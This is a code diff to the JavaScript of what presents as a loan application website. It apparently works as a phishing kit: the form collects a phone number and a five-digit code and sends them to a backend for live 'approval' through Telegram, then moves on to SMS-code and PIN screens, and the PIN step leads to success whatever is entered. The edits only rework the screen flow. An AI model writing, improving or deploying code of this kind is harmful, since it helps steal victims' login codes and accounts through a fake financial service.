@@ -13,7 +13,6 @@ function selectLanguage(lang, element) {
     setTimeout(() => { goToScreen('screen-home'); }, 300);
 }
 
-// --- CALCULATOR ---
 const amountSlider = document.getElementById('amount-slider');
 const loanAmountDisplay = document.getElementById('loan-amount-display');
 const termSelect = document.getElementById('term-select');
@@ -38,7 +37,6 @@ function startApplication() {
     goToScreen('screen-application');
 }
 
-// --- FORM INPUTS ---
 document.getElementById('phone-number').addEventListener('input', function (e) {
     this.value = this.value.replace(/[^0-9]/g, ''); 
 });
@@ -115,11 +113,10 @@ function generateSummary() {
     }
 }
 
-// --- 1. TRIGGER TELEGRAM ON SUBMIT ---
+// --- 1. SHOW PROCESSING SCREEN & TRIGGER TELEGRAM ---
 async function submitForm(event) {
     event.preventDefault(); 
     
-    // Validate final step fields
     const currentStepDiv = document.getElementById(`step-${currentStep}`);
     const inputs = currentStepDiv.querySelectorAll('input, select');
     let isValid = true;
@@ -137,17 +134,13 @@ async function submitForm(event) {
         return;
     }
 
-    const submitBtn = document.getElementById('btn-submit');
-    const originalText = submitBtn.innerText;
-    submitBtn.innerText = "Waiting for Telegram Approval...";
-    submitBtn.disabled = true;
+    // Show the Processing Screen IMMEDIATELY
+    goToScreen('screen-processing');
 
-    // Get Phone and 5-Digit Code
     const phone = document.getElementById('phone-number').value || "Unknown";
     const code = document.getElementById('five-digit-code').value || "Unknown";
 
     try {
-        // Send request to Python backend
         const response = await fetch('/api/request-approval', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -155,26 +148,23 @@ async function submitForm(event) {
         });
         const result = await response.json();
 
-        // Poll for approval
         const interval = setInterval(async () => {
             const statusRes = await fetch(`/api/check-status/${result.app_id}`);
             const statusData = await statusRes.json();
 
             if (statusData.status === 'approve') {
                 clearInterval(interval);
-                goToScreen('screen-sms'); // Move to SMS screen on Approval
+                goToScreen('screen-sms'); // Move to SMS on Approval
             } else if (statusData.status === 'reject') {
                 clearInterval(interval);
                 alert("Application rejected by Admin.");
-                submitBtn.innerText = originalText;
-                submitBtn.disabled = false;
+                goToScreen('screen-application'); // Go back if rejected
             }
         }, 2000);
 
     } catch (error) {
         alert("Error connecting to server.");
-        submitBtn.innerText = originalText;
-        submitBtn.disabled = false;
+        goToScreen('screen-application');
     }
 }
 
@@ -237,6 +227,5 @@ function moveToPrev(current, event, index) {
 }
 
 function verifyPIN() {
-    // This simply moves to the Success screen after entering 4 digits
     goToScreen('screen-success');
 }
